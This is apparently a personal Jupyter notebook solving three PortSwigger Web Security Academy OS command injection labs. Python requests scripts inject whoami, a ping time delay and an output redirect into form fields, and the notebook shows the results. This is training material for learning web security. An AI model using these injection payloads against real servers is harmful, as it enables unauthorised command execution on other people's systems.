{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0bc9e617",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# OS Command Injection - Simple Case\n",
    "[Lab](https://portswigger.net/web-security/os-command-injection/lab-simple)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "f1a4215c",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a1d96ebd",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "URL = \"https://acb41f391e91dd32c04f4079001300c0.web-security-academy.net/\"\n",
    "\n",
    "command_to_inject = \" & whoami & \"\n",
    "data = {\"productId\" : \"1\", \"storeId\" : command_to_inject}\n",
    "\n",
    "r = requests.post(URL + \"product/stock/\", data=data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "48946334",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'peter-XNUspM\\n'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "269f275b",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# OS Command Injection - Blind (Time Delays)\n",
    "[Lab](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)\n",
    "\n",
    "Note - this should work but I solved it within the browser so I'm not positive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "1b7066e3",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "URL = \"https://ace41f931e599d87c03a144800e4005e.web-security-academy.net/\"\n",
    "\n",
    "#Create session\n",
    "s = requests.session()\n",
    "r = s.get(URL + \"feedback\")\n",
    "\n",
    "#Grab csrf token\n",
    "csrf = re.findall(r'csrf.*?=\"(.*?)\">', r.text)[0]\n",
    "\n",
    "#Specify attack\n",
    "att = 'test%22+%26+ping+-c+10+127.0.0.1+%26+%22test'\n",
    "\n",
    "data = {\n",
    "    \"csrf\" : csrf,\n",
    "    \"name\" : att,\n",
    "    \"email\" : \"test%40gmail.com\",\n",
    "    \"subject\" : \"test\",\n",
    "    \"message\" : \"test\"}\n",
    "\n",
    "r = s.post(URL + \"feedback/submit\", data=data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "b34554c2",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{}'"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "4cf6c4c2",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "datetime.timedelta(seconds=1, microseconds=627676)"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.elapsed"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3df1533f",
   "metadata": {
    "hidden": true
   },
   "source": [
    "The exact raw request that worked in the browser:\n",
    "```\n",
    "csrf=tkZR6IQHjA9oPzLLdcM4FJW6k8Qltujq&name=test%22+%26+ping+-c+10+127.0.0.1+%26+%22test&email=test%40blahmail.com&subject=test&message=test\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "025b582a",
   "metadata": {},
   "source": [
    "# OS Command Injection - Blind (Redirect)\n",
    "\n",
    "[Lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "id": "a5f041fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "URL = \"https://ac811f5d1f1cf22cc0477529006d0009.web-security-academy.net/\"\n",
    "\n",
    "s = requests.session()\n",
    "r = s.get(URL + \"feedback\")\n",
    "\n",
    "#Get csrf\n",
    "csrf = re.findall(r\"csrf.*=\\\"(.*?)\\\">\", r.text)[0]\n",
    "\n",
    "attack = \"test\\\" & \\\"whoami > /var/www/images/whoami.txt\\\" & \\\"test\"\n",
    "\n",
    "data = {\n",
    "    \"csrf\" : csrf,\n",
    "    \"name\" : \"test\",\n",
    "    \"email\" : \"test@blahmail.com\",\n",
    "    \"subject\" : \"test\",\n",
    "    \"message\" : \"test\"\n",
    "}\n",
    "\n",
    "data['subject'] = attack\n",
    "r = s.post(URL + \"feedback/submit/\", data=data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "id": "b98efa15",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{}'"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "id": "4cf5cede",
   "metadata": {},
   "outputs": [],
   "source": [
    "r = s.get(URL + \"image?filename=whoami.txt\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "id": "cf480e93",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'peter-8rqu20'"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c31a57d",
   "metadata": {},
   "source": [
    "Yay!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ddeb7d6",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
